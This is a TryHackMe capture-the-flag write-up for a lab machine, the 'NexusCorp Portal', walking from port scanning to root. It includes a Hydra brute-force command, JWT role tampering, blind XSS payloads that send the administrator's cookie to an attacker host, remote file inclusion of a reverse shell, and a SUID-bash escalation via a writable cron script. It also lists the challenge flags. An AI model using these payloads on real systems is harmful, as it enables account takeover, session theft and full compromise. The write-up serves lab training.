# TryHackMe - NexusCorp Portal

> **Category:** Linux | Web Security
>
> **Difficulty:** Medium
>
> **Objective:** Enumerate the NexusCorp Employee Portal, identify authentication and authorization weaknesses, chain multiple web vulnerabilities to gain remote code execution, perform lateral movement, and escalate privileges to root.

---

# Scenario

The **NexusCorp Employee Portal** appears to be a normal internal employee application protected by authentication and role-based access controls. However, several seemingly minor weaknesses exist throughout the application. By carefully enumerating endpoints, manipulating requests, and chaining multiple vulnerabilities together, complete compromise of the target system can be achieved.

During this assessment the following attack chain was successfully performed:

- Username Enumeration
- Weak Password Discovery
- JWT Role Manipulation
- IDOR
- Blind Cross-Site Scripting (Blind XSS)
- Session Hijacking
- Remote File Inclusion (RFI)
- Remote Code Execution (RCE)
- Credential Reuse
- Privilege Escalation

---

# Investigation Methodology

```
Host Discovery
        │
        ▼
Port Enumeration
        │
        ▼
Web Enumeration
        │
        ▼
Username Enumeration
        │
        ▼
Password Attack
        │
        ▼
JWT Analysis
        │
        ▼
Privilege Escalation (Application)
        │
        ▼
IDOR
        │
        ▼
Blind XSS
        │
        ▼
Session Hijacking
        │
        ▼
RFI → Reverse Shell
        │
        ▼
Credential Discovery
        │
        ▼
Credential Reuse
        │
        ▼
Cron Privilege Escalation
        │
        ▼
Root
```

---

# Target Information

Target IP

```text
10.49.145.245
```

---

# Initial Enumeration

The first stage consisted of identifying open network services.

```bash
nmap -p- 10.49.145.245
```

Open ports discovered:

```text
22/tcp

80/tcp
```

Only SSH and HTTP were exposed.

The next step involved service enumeration.

---

# Service Enumeration

```bash
nmap -sC -sV 10.49.145.245
```

Results:

| Port | Service | Version |
|------|----------|----------|
|22|SSH|OpenSSH 9.6p1|
|80|HTTP|Apache 2.4.58|

HTTP Title:

```text
NexusCorp Portal
```

The web application appeared to be an employee login portal.

Since no additional services were exposed, further investigation focused entirely on the web application.

---

# Username Enumeration

The login page revealed that usernames followed a predictable naming convention.

```
firstname.lastname
```

Another publicly accessible page,

```text
team.php
```

listed several employees.

Recovered usernames:

```text
robert.wilson

james.wright

david.brown

emma.taylor

laura.hayes

michael.chen

sarah.johnson
```

These usernames were verified through the application's password recovery functionality and saved into a custom wordlist.

---

# Password Attack

Hydra was used against the employee login portal.

```bash
hydra \
-L user.txt \
-P /usr/share/wordlists/rockyou.txt \
10.49.145.245 \
http-post-form \
"/index.php:username=^USER^&password=^PASS^:F=Invalid"
```

Valid credentials recovered:

```text
Username

robert.wilson

Password

password
```

---

## Analysis

The application allowed password guessing without implementing sufficient protections such as account lockout or stronger password policies.

The recovered credentials provided authenticated access to the employee portal.

---

# JWT Analysis

After authentication, the application returned a JWT.

```json
{
    "token":"<JWT>",
    "expires_in":3600,
    "note":"Use this token as Authorization: Bearer <token>"
}
```

The token contained the following payload.

```json
{
    "sub":"robert.wilson",
    "role":"user"
}
```

---

## Analysis

Since the role is stored directly inside the JWT, the token was inspected and modified using Burp Suite.

Changing:

```json
"user"
```

to

```json
"admin"
```

granted elevated privileges.

After replaying the modified token against:

```
/api/files.php
```

the application responded:

```json
{
    "error":"Missing name parameter",
    "usage":"/api/files.php?name=/var/www/html/filename.txt"
}
```

This revealed an internal file access API that would later become useful.

---

# IDOR

While exploring the application, another endpoint was identified.

```
/api/users/profile.php?id=1
```

Changing the numeric identifier exposed other user profiles without any authorization checks.

Example:

```
id=5
```

Response:

```json
{
"id":5,
"username":"emma.taylor",
"email":"emma.taylor@nexus.corp",
"role":"user",
"notes":"Q3 migration notes: infra review pending approval"
}
```

---

## Analysis

The endpoint trusts the client-supplied identifier without verifying ownership.

This represents an **Insecure Direct Object Reference (IDOR)** vulnerability.

The first challenge flag was also recovered.

```
THM{1d0r_h0r1z0nt4l_4cc3ss_fl4g1}
```

---

# Blind Cross-Site Scripting

The administrative support functionality accepted user-controlled input.

Because administrators review submitted messages, it became an ideal location to test for Blind XSS.

A PHP web server was started.

```bash
sudo php -S 0.0.0.0:8081
```

Initial payload:

```html
"><script src=http://192.168.138.6:8081/name></script>
```

The incoming request confirmed successful JavaScript execution inside the administrator's browser.

After confirming execution, a cookie stealing payload was prepared.

```javascript
document.location='http://192.168.138.6:8081/index.php?c='+document.cookie;
```

An alternative payload was also tested.

```html
"><script>
fetch('http://192.168.138.6:4444/c?x='+document.cookie)
</script>
```

A Netcat listener was started.

```bash
nc -lvnp 4444
```

The administrator's browser connected back.

Captured cookie:

```text
nexus_session=
eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImxhdXJhLmhheWVzIiwgInJvbGUiOiAiYWRtaW4ifQ==
```

---

## Analysis

This demonstrates a successful **Blind Cross-Site Scripting (Blind XSS)** attack resulting in session hijacking.

Unlike reflected or stored XSS, the payload executed later when an administrator viewed the submitted content.

The stolen administrator session granted elevated access.

Second flag:

```text
THM{bl1nd_x55_s3ss10n_h1j4ck_fl4g2}
```

---

# Directory Enumeration

Gobuster was used for further enumeration.

```bash
gobuster dir \
-u http://10.49.145.245 \
-w common.txt
```

Interesting directories:

```text
/admin

/api

/backup

/support

/static
```

The backup directory contained an encrypted file.

```
config.enc
```

---

# Remote File Inclusion

The previously discovered endpoint

```
/api/files.php
```

appeared capable of reading files.

Local File Inclusion attempts such as

```
/etc/passwd
```

were unsuccessful.

Attention shifted toward **Remote File Inclusion (RFI)**.

A PHP reverse shell (PentestMonkey) was saved as:

```
shell.txt
```

A Python HTTP server was started.

```bash
python3 -m http.server 8000
```

The application successfully requested the remote file.

Moments later a reverse shell was received.

```bash
nc -lvnp 4444
```

Shell:

```text
uid=33(www-data)
```

---

## Analysis

The file API accepted remote URLs rather than restricting access to local files.

This allowed arbitrary PHP code hosted on the attacker's server to execute on the target.

The vulnerability therefore resulted in **Remote Code Execution (RCE)**.

Third flag:

```text
THM{rf1_2_rc3_f00th0ld_fl4g3}
```

---

# Shell Stabilization

The reverse shell was upgraded.

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Backgrounded:

```
CTRL+Z
```

Local terminal:

```bash
stty raw -echo

fg
```

Finally:

```bash
export TERM=xterm
```

This produced a fully interactive shell.

---

# Credential Discovery

Searching for configuration files:

```bash
find / -type f -name "config.*" 2>/dev/null
```

Recovered:

```text
/var/www/html/config.php
```

Contents:

```php
define('DB_HOST','localhost');

define('DB_NAME','nexusdb');

define('DB_USER','app_user');

define('DB_PASS','D3v0ps!2024');

define('JWT_SECRET','nexus_jwt_s3cr3t_2024');

define('APP_SECRET','nexus_app_k3y_2024');
```

---

## Analysis

The configuration file disclosed multiple sensitive credentials.

Most importantly:

```
DB_PASS

D3v0ps!2024
```

Although intended for the database, the password resembled a human-created credential.

Credential reuse was therefore tested.

---

# Lateral Movement

The password was tested against the local user:

```bash
su devops
```

Authentication succeeded.

User flag:

```text
THM{s5h_cr3d_r3u53_l4t3r4l_fl4g4}
```

---

## Analysis

The developer reused the database password as the Linux account password.

Credential reuse remains one of the most common privilege escalation techniques during real-world engagements.

---

# Privilege Escalation

Exploring writable files eventually revealed:

```
/opt/monitoring/health_report.sh
```

Contents:

```bash
#!/bin/bash

...

chmod +s /usr/bin/bash
```

The script was writable by the **devops** user.

A command granting the SUID bit to Bash was appended.

After the monitoring job executed, Bash inherited the SUID permission.

Running:

```bash
bash -p
```

resulted in:

```text
root
```

Root flag:

```text
THM{pr1v3sc_cr0n_r00t_fl4g5}
```

---

# Flags

## Flag 1

```text
THM{1d0r_h0r1z0nt4l_4cc3ss_fl4g1}
```

## Flag 2

```text
THM{bl1nd_x55_s3ss10n_h1j4ck_fl4g2}
```

## Flag 3

```text
THM{rf1_2_rc3_f00th0ld_fl4g3}
```

## Flag 4

```text
THM{s5h_cr3d_r3u53_l4t3r4l_fl4g4}
```

## Flag 5

```text
THM{pr1v3sc_cr0n_r00t_fl4g5}
```

---

# Attack Chain

```text
Nmap
    │
    ▼
Username Enumeration
    │
    ▼
Weak Password
    │
    ▼
Employee Login
    │
    ▼
JWT Role Manipulation
    │
    ▼
IDOR
    │
    ▼
Blind XSS
    │
    ▼
Admin Session Hijacking
    │
    ▼
Remote File Inclusion
    │
    ▼
Reverse Shell
    │
    ▼
Configuration File
    │
    ▼
Credential Reuse
    │
    ▼
devops
    │
    ▼
Writable Cron Script
    │
    ▼
SUID Bash
    │
    ▼
Root
```

---

# Vulnerabilities Identified

- Weak Password Policy
- Username Enumeration
- JWT Role Manipulation
- Insecure Direct Object Reference (IDOR)
- Blind Cross-Site Scripting (Blind XSS)
- Session Hijacking
- Remote File Inclusion (RFI)
- Remote Code Execution (RCE)
- Sensitive Configuration Disclosure
- Credential Reuse
- Writable Privileged Script
- Insecure Privilege Escalation

---

# Conclusion

This machine demonstrates how multiple seemingly low-impact vulnerabilities can be chained together into a complete compromise. The assessment began with straightforward username enumeration and password guessing, followed by manipulation of a JWT to obtain elevated application privileges. An IDOR exposed sensitive profile information, while a Blind XSS vulnerability enabled administrator session hijacking. Leveraging the administrative session uncovered an insecure file access endpoint that ultimately allowed Remote File Inclusion and remote code execution.

Post-exploitation revealed sensitive credentials stored in a configuration file, which were successfully reused to access the **devops** account. Finally, a writable monitoring script executed with elevated privileges allowed modification of Bash permissions, resulting in full root access.

This challenge highlights the importance of secure authentication practices, proper server-side authorization, careful handling of user input, protection of sensitive configuration files, prevention of credential reuse, and restricting write access to privileged scripts. Together, these weaknesses formed a complete attack path from unauthenticated access to full system compromise.
